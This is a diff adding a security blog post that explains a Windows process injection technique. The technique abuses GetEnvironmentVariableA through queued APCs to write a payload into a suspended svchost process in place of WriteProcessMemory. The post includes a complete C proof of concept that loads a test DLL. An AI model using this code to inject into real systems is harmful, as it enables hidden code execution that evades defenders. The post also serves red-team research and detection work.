@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>GetEnvironmentVariable as an alternative to WriteProcessMemory in process injections | Doomsday Vault</title>
+<meta name="generator" content="Jekyll v3.9.5" />
+<meta property="og:title" content="GetEnvironmentVariable as an alternative to WriteProcessMemory in process injections" />
+<meta name="author" content="X-C3LL" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Brief description of how to use GetEnvironmentVariable as an alternative to WriteProcessMemory" />
+<meta property="og:description" content="Brief description of how to use GetEnvironmentVariable as an alternative to WriteProcessMemory" />
+<link rel="canonical" href="http://localhost:4000/posts/2020/05/28/GetEnvironmentVariable-Process-Injection.html" />
+<meta property="og:url" content="http://localhost:4000/posts/2020/05/28/GetEnvironmentVariable-Process-Injection.html" />
+<meta property="og:site_name" content="Doomsday Vault" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-05-28T13:22:33+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="GetEnvironmentVariable as an alternative to WriteProcessMemory in process injections" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"X-C3LL"},"dateModified":"2020-05-28T13:22:33+02:00","datePublished":"2020-05-28T13:22:33+02:00","description":"Brief description of how to use GetEnvironmentVariable as an alternative to WriteProcessMemory","headline":"GetEnvironmentVariable as an alternative to WriteProcessMemory in process injections","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/2020/05/28/GetEnvironmentVariable-Process-Injection.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.jpg"},"name":"X-C3LL"},"url":"http://localhost:4000/posts/2020/05/28/GetEnvironmentVariable-Process-Injection.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=c27a30cb27997bd3ed45ba5a77bd97bd27cbeb64">
+    <!--[if lt IE 9]>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <![endif]-->
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <div class="wrapper">
+      <header>
+
+        <h1><a href="http://localhost:4000/">Doomsday Vault</a></h1>
+
+        
+          <img src="/assets/img/logo.jpg" alt="Logo" />
+        
+
+        <p>X-C3LL's Personal Blog :)</p>
+
+
+        
+        <ul class="downloads">
+          <li><a href="https://twitter.com/TheXC3LL">@TheXC3LL<strong>Twitter</strong></a></li>
+          <li><a href="https://www.linkedin.com/in/thexc3ll/">thexc3ll<strong>LinkedIn</strong></a></li>
+          <li><a href="https://mastodon.social/@XC3LL">@XC3LL<strong>Mastodon</strong></a></li>
+        </ul>
+        
+               <nav>
+  <ul>
+    <li><a href="/">Home</a></li>
+  <li><a href="/about.html">About</a></li>
+    <li><a href="/cves.html">CVEs</a></li>
+    <li><a href="/tools.html">Tools</a></li>
+    <li><a href="/stuff.html">Slides & Articles</a></li>
+  <li><a href="/rss.xml">RSS</a>/<a href="/atom.xml">Atom</a></li>
+  
+</ul>
+</nav>
+      </header>
+      <section>
+
+      <small>28 May 2020</small>
+<h1>GetEnvironmentVariable as an alternative to WriteProcessMemory in process injections</h1>
+
+
+<p>        
+This week I have been playing a bit with process injections (nothing fancy, just doing PoCs with the well-known techniques). Doing this task I started to wonder about alternative ways to write arbitrary content to an known address in the remote process, so I could avoid the use of WriteProcessMemory. I believe that this technique has to be documented somewhere in the intertubes but with my google-fu I could not find any reference to <strong>GetEnvironmentVariable</strong> and process injection. If you know any article/slide/whatever that references this idea, please ping me at twitter (<a href="https://twitter.com/TheXC3LL">@TheXC3LL</a>) so I can add it to this article.</p>
+
+<h2 id="0x00-introduction">0x00 Introduction</h2>
+
+<p>        
+Most common (and jurassic) process injection techniques relies on a common pattern based on VirtualAllocEx -&gt; WriteProcessMemory -&gt; (Change to RX if needed) -&gt; Trigger execution. Luckily in last years new techniques to write the payload inside the remote process have been discovered/implemented (Atom Bombing, Shared-Memory Reuse, NtMapViewOfSection, etc.) and also new ways to trigger the execution (SetWindowLong, PROPagate, WNF callbacks, etc.), so the landscape is growing.</p>
+
+<p>        
+I started to play with the idea of finding exported functions from Kernel32.dll that can write from an externally controlled buffer to an arbitrary memory address. Or in other words: we are interested on functions that can read a value controled by the injector and write that value to an arbitrary memory address. We are interested in Kernel32.dll because the addresses of exported functions can be retrieved with GetProcAddress (the virtual addresses will be the same between processes). If we discover a function that fits our requirements, we can call it via QueueUserAPC/NtQueueApcThread.</p>
+
+<p>        
+I googled for “Kernel32 exports” and found <a href="https://www.geoffchappell.com/studies/windows/win32/kernel32/api/index.htm">this list</a>, and after a few attempts our candidate appeared: GetEnvironmentVariable.</p>
+
+<h2 id="0x01-getenvironmentvariable">0x01 GetEnvironmentVariable</h2>
+
+<p>        
+This function has everything we need:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="nf">GetEnvironmentVariable</span><span class="p">(</span>
+  <span class="n">LPCTSTR</span> <span class="n">lpName</span><span class="p">,</span>
+  <span class="n">LPTSTR</span>  <span class="n">lpBuffer</span><span class="p">,</span>
+  <span class="n">DWORD</span>   <span class="n">nSize</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<p>        
+As we can see in the definition it takes 3 parameters:</p>
+
+<ul>
+  <li><strong>lpName</strong>: pointer to the name of the environment variable.</li>
+  <li><strong>_lpBuffer</strong>: buffer where the value of the environment variable will be stored</li>
+  <li><strong>nSize</strong>: buffer size</li>
+</ul>
+
+<p>        
+We can create a suspended process with custom environment variables with <strong>SetEnvironmentVariable</strong> and <strong>CreateProcess</strong> and later, from the target processes, read that environment variable and write the content to a buffer…:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SetEnvironmentVariableA</span><span class="p">(</span><span class="s">"CustomVar"</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
+
+	<span class="n">bSuccess</span> <span class="o">=</span> <span class="n">CreateProcessA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span>
+		<span class="s">"c:</span><span class="se">\\</span><span class="s">windows</span><span class="se">\\</span><span class="s">system32</span><span class="se">\\</span><span class="s">SVCHOST.EXE -k NetworkService"</span><span class="p">,</span>
+		<span class="nb">NULL</span><span class="p">,</span>
+		<span class="nb">NULL</span><span class="p">,</span>
+		<span class="n">FALSE</span><span class="p">,</span>
+		<span class="n">CREATE_SUSPENDED</span><span class="p">,</span>
+		<span class="nb">NULL</span><span class="p">,</span>
+		<span class="nb">NULL</span><span class="p">,</span>
+		<span class="o">&amp;</span><span class="n">siStartInfo</span><span class="p">,</span>
+		<span class="o">&amp;</span><span class="n">piProcInfo</span>
+	<span class="p">);</span>
+</code></pre></div></div>
+
+<p>        
+…the only problem is that we need to know an address where that string “CustomVar” exists (to use it as lpName parameter).</p>
+
+<p>        
+Parameter lpBuffer is known by us because is the location of the memory reserved via VirtualAllocEx and nSize is known too by the same reason. The only “unknown” parameter is the pointer to an environment variable name which content is controlled by us. How can we solve this?</p>
+
+<h2 id="0x02-string-reuse">0x02 String reuse</h2>
+
+<p>        
+We cannot find out a priori any pointer to the “CustomVar” string… but we can reuse any string located in a known address <strong>:)</strong>. As we said at the begining, the virtual addresses of kernel32.dll are shared between proceses, so we can create an environment variable using as name a string present in this module. We only need to know the offset where the string lies and calculate the address dynamically. For example, something like:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">hModK</span> <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">"Kernel32"</span><span class="p">);</span>
+	<span class="n">address</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hModK</span><span class="p">,</span> <span class="s">"AllocConsole"</span><span class="p">);</span> <span class="c1">//Just a reference point</span>
+	<span class="n">address</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x591A8</span><span class="p">;</span> <span class="c1">//SdbInitDatabaseEx in kernel32</span>
+</code></pre></div></div>
+
+<p>        
+Then call SetEnvironmentVariable with this value and CreateProcess:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SetEnvironmentVariableA</span><span class="p">(</span><span class="s">"SdbInitDatabaseEx"</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
+<span class="n">CreateProcessA</span><span class="p">(...)</span>
+<span class="p">...</span>
+</code></pre></div></div>
+<p>        
+Lastly we only need to enqueue the call to GetEnvironmentVariable with all the parameters:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">NtQueueApcThread</span><span class="p">(</span><span class="n">piProcInfo</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hModK</span><span class="p">,</span> <span class="s">"GetEnvironmentVariableA"</span><span class="p">),</span> <span class="n">address</span><span class="p">,</span> <span class="n">payload_location</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+</code></pre></div></div>
+
+<h2 id="0x03-poc--gtfo">0x03 PoC || GTFO</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;psapi.h&gt;</span><span class="cp">
+</span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">PROCESS_INFORMATION</span> <span class="n">piProcInfo</span><span class="p">;</span>
+	<span class="n">STARTUPINFOA</span> <span class="n">siStartInfo</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+	<span class="n">BOOL</span> <span class="n">bSuccess</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
+	<span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"C:</span><span class="se">\\</span><span class="s">Test</span><span class="se">\\</span><span class="s">alert.dll"</span><span class="p">;</span>
+	<span class="kt">void</span><span class="o">*</span> <span class="n">payload_location</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">HMODULE</span> <span class="n">hModK</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">HMODULE</span> <span class="n">hModN</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="kt">char</span><span class="o">*</span> <span class="n">kernel32_string</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">FARPROC</span> <span class="n">address</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">NTSTATUS</span><span class="p">(</span><span class="n">NTAPI</span> <span class="o">*</span> <span class="n">NtQueueApcThread</span><span class="p">)(</span>
+		<span class="n">_In_</span> <span class="n">HANDLE</span> <span class="n">ThreadHandle</span><span class="p">,</span>
+		<span class="n">_In_</span> <span class="n">PVOID</span> <span class="n">ApcRoutine</span><span class="p">,</span>
+		<span class="n">_In_</span> <span class="n">PVOID</span> <span class="n">ApcRoutineContext</span> <span class="n">OPTIONAL</span><span class="p">,</span>
+		<span class="n">_In_</span> <span class="n">PVOID</span> <span class="n">ApcStatusBlock</span> <span class="n">OPTIONAL</span><span class="p">,</span>
+		<span class="n">_In_</span> <span class="n">ULONG</span> <span class="n">ApcReserved</span> <span class="n">OPTIONAL</span>
+		<span class="p">);</span>
+
+
+	<span class="n">hModK</span> <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">"Kernel32"</span><span class="p">);</span>
+	<span class="n">address</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hModK</span><span class="p">,</span> <span class="s">"AllocConsole"</span><span class="p">);</span><span class="c1">//Just a reference point</span>
+	<span class="n">address</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x591A8</span><span class="p">;</span> <span class="c1">//SdbInitDatabaseEx in kernel32</span>
+	<span class="n">SetEnvironmentVariableA</span><span class="p">(</span><span class="s">"SdbInitDatabaseEx"</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
+
+	<span class="n">bSuccess</span> <span class="o">=</span> <span class="n">CreateProcessA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span>
+		<span class="s">"c:</span><span class="se">\\</span><span class="s">windows</span><span class="se">\\</span><span class="s">system32</span><span class="se">\\</span><span class="s">SVCHOST.EXE -k NetworkService"</span><span class="p">,</span>
+		<span class="nb">NULL</span><span class="p">,</span>
+		<span class="nb">NULL</span><span class="p">,</span>
+		<span class="n">FALSE</span><span class="p">,</span>
+		<span class="n">CREATE_SUSPENDED</span><span class="p">,</span>
+		<span class="nb">NULL</span><span class="p">,</span>
+		<span class="nb">NULL</span><span class="p">,</span>
+		<span class="o">&amp;</span><span class="n">siStartInfo</span><span class="p">,</span>
+		<span class="o">&amp;</span><span class="n">piProcInfo</span>
+	<span class="p">);</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSuccess</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="n">payload_location</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">piProcInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
+	<span class="n">hModN</span> <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">"ntdll"</span><span class="p">);</span>
+	<span class="n">NtQueueApcThread</span> <span class="o">=</span> <span class="p">(</span><span class="n">NTSTATUS</span><span class="p">(</span><span class="n">NTAPI</span><span class="o">*</span><span class="p">)(</span><span class="n">HANDLE</span><span class="p">,</span> <span class="n">PVOID</span><span class="p">,</span> <span class="n">PVOID</span><span class="p">,</span> <span class="n">PVOID</span><span class="p">,</span> <span class="n">ULONG</span><span class="p">))</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hModN</span><span class="p">,</span> <span class="s">"NtQueueApcThread"</span><span class="p">);</span>
+	<span class="n">NtQueueApcThread</span><span class="p">(</span><span class="n">piProcInfo</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hModK</span><span class="p">,</span> <span class="s">"GetEnvironmentVariableA"</span><span class="p">),</span> <span class="n">address</span><span class="p">,</span> <span class="n">payload_location</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+	<span class="n">QueueUserAPC</span><span class="p">(</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hModK</span><span class="p">,</span> <span class="s">"LoadLibraryA"</span><span class="p">),</span> <span class="n">piProcInfo</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span> <span class="n">payload_location</span><span class="p">);</span>
+	<span class="n">ResumeThread</span><span class="p">(</span><span class="n">piProcInfo</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="0x04-conclusions">0x04 Conclusions</h2>
+
+<p>        
+This technique is just one more to add to our toolbox. Of course the usage of GetEnvironmentVariable has its drawbacks, like for example the usage of ASCII shellcodes to avoid issues.</p>
+
+<p>        
+As I said before, I believe this technique probably is documented somewhere but I could not find any source. If you find any reference to this way of avoiding WriteProcessMemory, know more interesting ideas about this topic, or just want ot point me an error/typ feel free to contact me (<a href="https://twitter.com/TheXC3LL">@TheXC3LL</a>).</p>
+
+
+
+
+      </section>
+      <footer>
+        
+        <p>This project is maintained by <a href="https://github.com/pages-themes">pages-themes</a></p>
+        
+        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
+      </footer>
+    </div>
+    <script src="/assets/js/scale.fix.js"></script>
+  </body>
+</html>
